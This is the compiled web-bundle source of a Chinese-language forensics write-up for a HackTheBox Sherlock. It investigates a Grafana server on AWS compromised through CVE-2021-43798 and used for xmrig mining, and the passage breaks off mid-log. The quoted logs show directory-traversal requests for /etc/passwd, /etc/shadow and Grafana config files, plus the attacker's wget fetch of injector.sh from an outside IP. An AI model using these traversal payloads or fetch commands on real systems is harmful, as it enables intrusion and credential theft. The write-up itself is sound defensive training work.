"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[792],{77439:(e,a,t)=>{t.r(a),t.d(a,{assets:()=>m,contentTitle:()=>o,default:()=>c,frontMatter:()=>s,metadata:()=>i,toc:()=>d});var n=t(85893),r=t(11151);const s={},o="Ore",i={id:"HackTheBox/Sherlocks/Ore/index",title:"Ore",description:'One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named "xmrig". Important Information Our organisation\'s office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance.',source:"@site/docs/HackTheBox/Sherlocks/Ore/index.md",sourceDirName:"HackTheBox/Sherlocks/Ore",slug:"/HackTheBox/Sherlocks/Ore/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Sherlocks/Ore/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"OpTinselTrace-2",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/OpTinselTrace-2/"},next:{title:"Recollection",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Recollection/"}},m={},d=[{value:"\u9898\u76ee\u6570\u636e",id:"\u9898\u76ee\u6570\u636e",level:2},{value:"\u9898\u76ee\u9644\u4ef6\u8bb2\u89e3",id:"\u9898\u76ee\u9644\u4ef6\u8bb2\u89e3",level:2},{value:"Task 1",id:"task-1",level:2},{value:"Task 2",id:"task-2",level:2},{value:"Task 3",id:"task-3",level:2},{value:"Task 4",id:"task-4",level:2},{value:"Task 5",id:"task-5",level:2},{value:"Task 6",id:"task-6",level:2},{value:"Task 7",id:"task-7",level:2},{value:"Task 8",id:"task-8",level:2},{value:"Task 9",id:"task-9",level:2},{value:"Task 10",id:"task-10",level:2},{value:"Task 11",id:"task-11",level:2},{value:"Task 12",id:"task-12",level:2},{value:"Task 13",id:"task-13",level:2},{value:"Task 14",id:"task-14",level:2}];function l(e){const a={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components},{Details:s}=a;return s||function(e,a){throw new Error("Expected "+(a?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(a.h1,{id:"ore",children:"Ore"}),"\n",(0,n.jsxs)(a.admonition,{title:"Sherlock Scenario",type:"info",children:[(0,n.jsx)(a.p,{children:'One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named "xmrig". Important Information Our organisation\'s office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance.'}),(0,n.jsx)(a.p,{children:'\u6211\u4eec\u7684\u6280\u672f\u5408\u4f5c\u4f19\u4f34\u76ee\u524d\u6b63\u5728\u7ba1\u7406\u6211\u4eec\u7684 AWS \u57fa\u7840\u8bbe\u65bd\u3002\u6211\u4eec\u8bf7\u6c42\u5c06\u67d0\u4e9b\u6280\u672f\u90e8\u7f72\u5230\u4e91\u4e2d\u3002\u6240\u63d0\u51fa\u7684\u89e3\u51b3\u65b9\u6848\u662f\u6258\u7ba1 Grafana \u5e94\u7528\u7684\u4e00\u4e2a EC2 \u5b9e\u4f8b\u3002\u5728 EC2 \u90e8\u7f72\u540e\u4e0d\u4e45\uff0cCPU \u4f7f\u7528\u7387\u5c31\u6301\u7eed\u8fbe\u5230\u4e86 98% \u4ee5\u4e0a\uff0c\u4e00\u4e2a\u540d\u4e3a "xmrig" \u7684\u8fdb\u7a0b\u5bfc\u81f4\u3002\u91cd\u8981\u4fe1\u606f\uff1a\u6211\u4eec\u7ec4\u7ec7\u529e\u516c\u5ba4\u7684\u516c\u7f51 IP \u662f 86.5.206.121\uff0c\u5728\u90e8\u7f72\u5e94\u7528\u540e\uff0c\u6211\u4eec\u8fdb\u884c\u4e86\u4e00\u4e9b\u57fa\u672c\u7684\u6f0f\u6d1e\u6d4b\u8bd5\u548c\u7ef4\u62a4\u3002'})]}),"\n",(0,n.jsx)(a.h2,{id:"\u9898\u76ee\u6570\u636e",children:"\u9898\u76ee\u6570\u636e"}),"\n",(0,n.jsx)(a.p,{children:(0,n.jsx)(a.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:t(59146).Z+"",children:"ore.zip"})}),"\n",(0,n.jsx)(a.h2,{id:"\u9898\u76ee\u9644\u4ef6\u8bb2\u89e3",children:"\u9898\u76ee\u9644\u4ef6\u8bb2\u89e3"}),"\n",(0,n.jsx)(a.p,{children:"\u7ecf\u8fc7\u5206\u6790\uff0c\u672c\u9644\u4ef6\u4e3b\u8981\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5f00\u6e90\u9879\u76ee\u7684\u6587\u4ef6"}),"\n",(0,n.jsxs)(a.ul,{children:["\n",(0,n.jsx)(a.li,{children:(0,n.jsx)(a.a,{href:"https://github.com/grafana/grafana",children:"grafana"})}),"\n",(0,n.jsx)(a.li,{children:(0,n.jsx)(a.a,{href:"https://github.com/WithSecureLabs/LinuxCatScale",children:"Linux-CatScale"})}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:[(0,n.jsx)(a.code,{children:"grafana"})," \u7684\u6587\u4ef6\u4f4d\u4e8e ",(0,n.jsx)(a.code,{children:".\\usr\\share\\grafana"})," \u6587\u4ef6\u5939\u5185\uff0c\u6709\u4ee5\u4e0b\u6587\u4ef6"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"Mode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd----          2022/11/24    23:53                .cache\nd----          2022/11/24    23:53                .config\nd----          2022/11/24    23:53                .gnupg\nd----          2022/11/24    23:53                .local\nd----          2022/11/24    23:53                bin\nd----          2022/11/24    23:53                conf\nd----          2022/11/24    23:53                data\nd----          2022/11/24    23:53                plugins-bundled\nd----          2022/11/24    23:53                public\nd----          2022/11/24    23:53                scripts\n-----          2022/11/24    23:53           3348 .bash_history\n-----          2022/11/24    23:53             66 .selected_editor\n-----          2022/11/24    23:53           8809 .viminfo\n-----          2022/11/24    23:53              5 VERSION\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="\u6587\u4ef6\u5939\u7ed3\u6784\u6811"',children:"D:.\n\u251c\u2500.cache - \u7f13\u5b58\n\u251c\u2500.config\n\u2502  \u2514\u2500lxc - lxc \u914d\u7f6e\u6587\u4ef6\n\u251c\u2500.gnupg - gnupg \u914d\u7f6e\u6587\u4ef6\n\u2502  \u2514\u2500private-keys-v1.d\n\u251c\u2500.local\n\u2502  \u2514\u2500share\n\u2502      \u2514\u2500nano\n\u251c\u2500bin - grafana \u4e8c\u8fdb\u5236\u7a0b\u5e8f\n\u251c\u2500conf - grafana \u914d\u7f6e\u6587\u4ef6\n\u2502  \u2514\u2500provisioning - \u5404\u4e2a\u7ec4\u4ef6\u7684\u914d\u7f6e\u6587\u4ef6\n\u2502      \u251c\u2500access-control\n\u2502      \u251c\u2500dashboards\n\u2502      \u251c\u2500datasources\n\u2502      \u251c\u2500notifiers\n\u2502      \u2514\u2500plugins\n\u251c\u2500data - grafana \u6570\u636e\u5b58\u653e\u76ee\u5f55\n\u2502  \u251c\u2500csv\n\u2502  \u251c\u2500log - grafana \u65e5\u5fd7\u76ee\u5f55\n\u2502  \u251c\u2500plugins\n\u2502  \u2514\u2500png\n\u251c\u2500plugins-bundled - \u63d2\u4ef6\u76ee\u5f55\n\u2502  \u2514\u2500internal\n\u2502      \u2514\u2500input-datasource\n\u2502          \u2514\u2500img\n\u251c\u2500public - grafana \u670d\u52a1\u7aef web \u76f8\u5173\u6587\u4ef6\n\u2514\u2500scripts - grafana \u542f\u52a8\u811a\u672c\n"})}),"\n",(0,n.jsxs)(a.p,{children:[(0,n.jsx)(a.code,{children:"Linux-CatScale"})," \u7684\u6587\u4ef6\u4f4d\u4e8e ",(0,n.jsx)(a.code,{children:"catscale_ip-172-31-13-147-20221124-1501.tar.gz"})," \u538b\u7f29\u5305\u5185\uff0c\u89e3\u538b\u540e\u5f97\u5230"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"Mode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd----          2022/11/24    23:01                Docker\nd----          2022/11/24    23:02                Logs\nd----          2022/11/24    23:08                Misc\nd----          2022/11/24    23:07                Persistence\nd----          2022/11/24    23:01                Podman\nd----          2022/11/24    23:07                Process_and_Network\nd----          2022/11/24    23:07                System_Info\nd----          2022/11/24    23:01                User_Files\nd----          2022/11/24    23:01                Virsh\n-a---          2022/11/24    23:07           1804 ip-172-31-13-147-20221124-1501-console-error-log.txt\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="\u6587\u4ef6\u5939\u7ed3\u6784\u6811"',children:"D:.\n\u251c\u2500Docker - docker \u76f8\u5173\u4fe1\u606f\n\u251c\u2500Logs - `/var/log` \u76ee\u5f55\u4e0b\u7684\u65e5\u5fd7\u6587\u4ef6\n\u251c\u2500Misc - \u5176\u4ed6\u76ee\u5f55\u4e0b\u7684\u65e5\u5fd7\u4fe1\u606f\n\u251c\u2500Persistence - \u6d89\u53ca\u5230\u6301\u4e45\u5316\u653b\u51fb\u7684\u76f8\u5173\u65e5\u5fd7\n\u251c\u2500Podman - podman \u76f8\u5173\u4fe1\u606f\n\u251c\u2500Process_and_Network - \u8fdb\u7a0b\u4e0e\u7f51\u7edc\n\u251c\u2500System_Info - \u7cfb\u7edf\u4fe1\u606f\n\u251c\u2500User_Files - \u7528\u6237\u7684\u6587\u4ef6\n\u2514\u2500Virsh - Virsh kvm \u76f8\u5173\u4fe1\u606f\n"})}),"\n",(0,n.jsxs)(a.p,{children:["\u7531\u4e8e ",(0,n.jsx)(a.code,{children:"Linux-CatScale"})," \u4f1a\u5bf9\u4e00\u4e9b\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u538b\u7f29\u5904\u7406\uff0c\u6240\u4ee5\u5f00\u59cb\u5904\u7406\u4e4b\u524d\u5148\u5bf9\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u7684\u538b\u7f29\u6587\u4ef6\u8fdb\u884c\u89e3\u538b\u7f29\u5904\u7406"]}),"\n",(0,n.jsx)(a.h2,{id:"task-1",children:"Task 1"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u54ea\u4e2a CVE \u5bfc\u81f4\u4e86 EC2 \u7684\u521d\u59cb\u59a5\u534f\uff1f"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u5728 ",(0,n.jsx)(a.code,{children:".\\grafana\\data\\log\\grafana.log.2022-11-18.001"})," \u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u4ee5\u4e0b\u8bb0\u5f55"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title=".\\grafana\\data\\log\\grafana.log.2022-11-18.001"',children:'t=2022-11-17T14:40:55+0000 lvl=info msg="Request Completed" logger=context userId=1 orgId=1 uname=admin method=GET path=/api/live/ws status=0 remote_addr=89.247.167.247 time_ms=1 size=0 referer=\n'})}),"\n",(0,n.jsx)(a.p,{children:"\u501f\u7531\u5173\u952e\u8bcd\u641c\u7d22\uff0c\u53ef\u4ee5\u786e\u5b9a\u662f grafana \u7684\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u7f16\u53f7"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"CVE-2021-43798\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-2",children:"Task 2"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u8bf7\u8be6\u7ec6\u8bf4\u660e\u5a01\u80c1\u884c\u4e3a\u8005\uff08TA\uff09\u7528\u4e8e\u9488\u5bf9\u6211\u4eec\u7ec4\u7ec7\u7684\u6240\u6709\u6076\u610f IP \u5730\u5740\u3002"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u8fd9\u91cc\u805a\u7126\u4e8e ",(0,n.jsx)(a.code,{children:"grafana"})," \u7684\u65e5\u5fd7\u6587\u4ef6\u8fdb\u884c\u5206\u6790"]}),"\n",(0,n.jsxs)(a.admonition,{title:"\u6ce8\u610f\u529e\u516c\u5ba4\u7684\u516c\u7f51 ip \u5730\u5740",type:"note",children:[(0,n.jsx)(a.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u80cc\u666f\u4fe1\u606f\u91cc\u9762\u5df2\u7ecf\u63d0\u4f9b\u4e86\u529e\u516c\u5ba4\u7684\u516c\u7f51 IP\uff0c\u5e94\u8be5\u5728\u6076\u610f\u540d\u5355\u5185\u53bb\u9664\u8fd9\u4e2a ip \u5730\u5740"}),(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"86.5.206.121\n"})})]}),"\n",(0,n.jsx)(a.p,{children:"\u9996\u5148\uff0c\u5148\u4f7f\u7528 python \u811a\u672c\u7b5b\u9009\u4e00\u4e0b web \u8bbf\u95ee\u7684\u8def\u5f84"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-python",children:'for index in range(18, 25):\n    with open("./grafana.log.2022-11-{}.001".format(index), "r") as f:\n        log_data = f.read()\n    log_data = log_data.split("\\n")\n    for i in log_data:\n        if "86.5.206.121" not in i and "remote_addr" in i and "Request Completed" in i:\n            info_1 = i.split(\'"\')\n            info_2 = [i for i in info_1[2].split("") if i.startswith(("path","remote_addr"))]\n            if info_2[0] in ["path=/", "path=/login", "path=/api/search"]:\n                continue\n            print(info_1[1], " ".join(info_2))\n'})}),"\n",(0,n.jsxs)(s,{children:[(0,n.jsx)("summary",{children:" \u811a\u672c\u8f93\u51fa\u7684\u7ed3\u679c "}),(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"Request Completed path=/ remote_addr=89.247.167.247\nRequest Completed path=/api/user/password/reset remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/etc/passwd remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/api/live/ws remote_addr=89.247.167.247\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/grafana.ini remote_addr=89.247.167.247\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/ remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/ remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=86.31.99.194\nRequest Completed path=/login remote_addr=86.31.99.194\nRequest Completed path=/login remote_addr=85.255.236.29\nRequest Completed path=/login remote_addr=213.205.198.177\nRequest Completed path=/login remote_addr=86.24.61.7\nRequest Completed path=/login remote_addr=92.40.168.226\nRequest Completed path=/login remote_addr=86.24.222.206\nRequest Completed path=/login remote_addr=62.254.9.100\nRequest Completed path=/login remote_addr=87.80.124.243\nRequest Completed path=/login remote_addr=45.133.172.63\nRequest Completed path=/login remote_addr=188.241.82.31\nRequest Completed path=/login remote_addr=188.241.82.31\nRequest Completed path=/login remote_addr=212.102.35.14\nRequest Completed path=/login remote_addr=212.102.35.14\nRequest Completed path=/login remote_addr=181.214.218.45\nRequest Completed path=/login remote_addr=181.214.218.45\nRequest Completed path=/login remote_addr=212.102.36.3\nRequest Completed path=/login remote_addr=156.146.60.29\nRequest Completed path=/login remote_addr=156.146.60.29\nRequest Completed path=/login remote_addr=216.24.213.40\nRequest Completed path=/login remote_addr=194.32.122.58\nRequest Completed path=/ remote_addr=71.6.232.20\nRequest Completed path=/ remote_addr=193.118.53.210\nRequest Completed path=/login remote_addr=193.118.53.210\nRequest Completed path=/ remote_addr=198.235.24.155\nRequest Completed path=/login remote_addr=198.235.24.155\nRequest Completed path=/login remote_addr=78.146.160.14\nRequest Completed path=/ remote_addr=205.210.31.132\nRequest Completed path=/ remote_addr=205.210.31.51\nRequest Completed path=/login remote_addr=205.210.31.51\nRequest Completed path=/login remote_addr=44.192.62.21\nRequest Completed path=/login remote_addr=89.247.167.246\nRequest Completed path=/login remote_addr=89.247.167.246\nRequest Completed path=/ remote_addr=89.247.167.246\nRequest Completed path=/api/live/ws remote_addr=89.247.167.246\nRequest Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=89.247.167.246\nRequest Completed path=/api/dashboards/home remote_addr=89.247.167.246\nRequest Completed path=/api/search remote_addr=89.247.167.246\nRequest Completed path=/api/plugins remote_addr=89.247.167.246\nRequest Completed path=/api/search remote_addr=89.247.167.246\nRequest Completed path=/api/search remote_addr=89.247.167.246\nRequest Completed path=/api/search remote_addr=89.247.167.246\nRequest Completed path=/api/search remote_addr=89.247.167.246\nRequest Completed path=/api/frontend-metrics remote_addr=89.247.167.246\nRequest Completed path=/login remote_addr=87.80.124.243\nRequest Completed path=/ remote_addr=95.181.232.32\nRequest Completed path=/login remote_addr=95.181.232.32\nRequest Completed path=/ remote_addr=95.181.232.32\nRequest Completed path=/ remote_addr=95.181.232.32\nRequest Completed path=\nRequest Completed path=/public/plugins/alertlist/../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../etc/shadow remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/sample.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/config/sample.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/template.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32\nRequest Completed path=/login remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32\nRequest Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=195.80.150.137\nRequest Completed path=/ remote_addr=195.80.150.137\nRequest Completed path=/login remote_addr=195.80.150.137\nRequest Completed path=/login remote_addr=195.80.150.137\nRequest Completed path=/ remote_addr=195.80.150.137\nRequest Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=195.80.150.137\nRequest Completed path=/api/live/ws remote_addr=195.80.150.137\nRequest Completed path=/api/dashboards/home remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/plugins remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/live/list remote_addr=195.80.150.137\nRequest Completed path=/api/frontend-metrics remote_addr=195.80.150.137\nRequest Completed path=/api/users/search remote_addr=195.80.150.137\nRequest Completed path=/avatar/7948431d6e0557fd0c57d91a7cd50cad remote_addr=195.80.150.137\nRequest Completed path=/api/dashboards/tags remote_addr=195.80.150.137\nRequest Completed path=/api/search/sorting remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\nRequest Completed path=/api/search remote_addr=195.80.150.137\n"})}),(0,n.jsx)(a.p,{children:"\u7ecf\u8fc7\u7b5b\u9009\uff0c\u53ef\u4ee5\u5f97\u5230 ip \u6570\u636e\u7684\u96c6\u5408"}),(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"89.247.167.247     11\n86.24.61.7         14\n86.31.99.194       2\n85.255.236.29      1\n213.205.198.177    1\n92.40.168.226      1\n86.24.222.206      1\n62.254.9.100       1\n87.80.124.243      2\n45.133.172.63      1\n188.241.82.31      2\n212.102.35.14      2\n181.214.218.45     2\n212.102.36.3       1\n156.146.60.29      2\n216.24.213.40      1\n194.32.122.58      1\n71.6.232.20        1\n193.118.53.210     2\n198.235.24.155     2\n78.146.160.14      1\n205.210.31.132     1\n205.210.31.51      2\n44.192.62.21       1\n89.247.167.246     13\n95.181.232.32      25\n195.80.150.137     22\n"})})]}),"\n",(0,n.jsx)(a.p,{children:"\u518d\u4f7f\u7528\u811a\u672c\uff0c\u5bf9\u767b\u9646\u5931\u8d25\u7684\u8bb0\u5f55\u8fdb\u884c\u7b5b\u9009"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-python",children:'ips = {}\n\nfor index in range(18, 25):\n    with open("./grafana.log.2022-11-{}.001".format(index), "r") as f:\n        log_data = f.read()\n    log_data = log_data.split("\\n")\n    for i in log_data:\n        if "86.5.206.121" not in i and "remote_addr" in i and "Invalid username or password" in i:\n            info_1 = i.split(\'"\')\n            info_2 = [i for i in info_1[2].split("") if i.startswith(("remote_addr"))]\n            print(info_1[1], " ".join(info_2))\n            ip = [i for i in i.split("") if i.startswith(("remote_addr"))][0].split("=")[1]\n            if ip in ips.keys():\n                ips[ip] += 1\n            else:\n                ips[ip] = 1\n\nfor i in ips.keys():\n    print(str(i).ljust(18," "), ips[i])\n'})}),"\n",(0,n.jsx)(a.p,{children:"\u5f97\u5230\u4ee5\u4e0b ip \u7684\u96c6\u5408"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"86.24.61.7         11\n86.31.99.194       1\n95.181.232.32      1\n"})}),"\n",(0,n.jsxs)(a.p,{children:["\u540c\u65f6\uff0c\u5bf9 ",(0,n.jsx)(a.code,{children:"syslog"})," \u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u67e5\u627e\u5176\u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u653b\u51fb\u884c\u4e3a\uff0c\u53d1\u73b0\u4ee5\u4e0b ip"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:"44.204.18.94\n"})}),"\n",(0,n.jsx)(a.p,{children:"\u6700\u7ec8\u6574\u5408\u4e0a\u9762\u5206\u6790\u51fa\u6765\u7684\u4fe1\u606f\uff0c\u5f97\u5230\u6700\u7ec8\u7b54\u6848"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"44.204.18.94,95.181.232.32,195.80.150.137\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-3",children:"Task 3"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"TA \u4f7f\u7528\u54ea\u4e2a\u8d26\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4ee5\u8bbf\u95ee\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\uff1f"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u5c06 ",(0,n.jsx)(a.code,{children:".\\catscale_out\\Logs\\ip-172-31-13-147-20221124-1501-var-log.tar.gz"})," \u6587\u4ef6\u8fdb\u884c\u89e3\u538b\u7f29\uff0c\u5728\u5176\u4e2d\u627e\u5230 ",(0,n.jsx)(a.code,{children:"auth.log"})," \u8fd9\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d\u6240\u8bb0\u5f55\u7684\u662f\u7cfb\u7edf\u7684\u9274\u6743\u65e5\u5fd7\uff0c\u5728 sshd \u90e8\u5206\u5c31\u53ef\u4ee5\u770b\u5230\u76f8\u5173\u9274\u6743\u65e5\u5fd7"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="auth.log"',children:'Nov 23 11:17:18 ip-172-31-60-25 sshd[6105]: Accepted password for grafana from 195.80.150.137 port 52172 ssh2"\n'})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"grafana\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-4",children:"Task 4"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:'TA \u4fee\u6539\u4e86\u54ea\u4e2a\u6587\u4ef6\u4ee5\u63d0\u5347\u6743\u9650\u5e76\u4ee5 "root" \u8eab\u4efd\u8fd0\u884c\u6316\u77ff\u670d\u52a1\uff1f'}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u67e5\u770b ",(0,n.jsx)(a.code,{children:"Persistence\\ip-172-31-13-147-20221124-1501-cron-tab-list.txt"})," \u6587\u4ef6\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-shell",children:"30 8 * * * /opt/automation/updater.sh\nENDOFUSERCRON\nubuntu\nno crontab for ubuntu\nENDOFUSERCRON\ngrafana\nno crontab for grafana\nENDOFUSERCRON\nitadmin-forela\nno crontab for itadmin-forela\nENDOFUSERCRON\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"/opt/automation/updater.sh\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-5",children:"Task 5"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"TA \u4f7f\u7528\u54ea\u4e2a\u7a0b\u5e8f\u4e0b\u8f7d\u4e86 injector.sh \u811a\u672c\uff1f"}),"\n"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~/tmp/var/log]\n\u2514\u2500\u2500\u257c $ cat syslog | grep "injector.sh"\nNov 24 08:30:01 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T08:30:01.467399000Z"/><EventRecordID>75097</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 08:30:01.467</Data><Data Name="ProcessGuid">{c9eb4a87-2b89-637f-700c-0807f5550000}</Data><Data Name="ProcessId">3372</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/root</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">64</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data 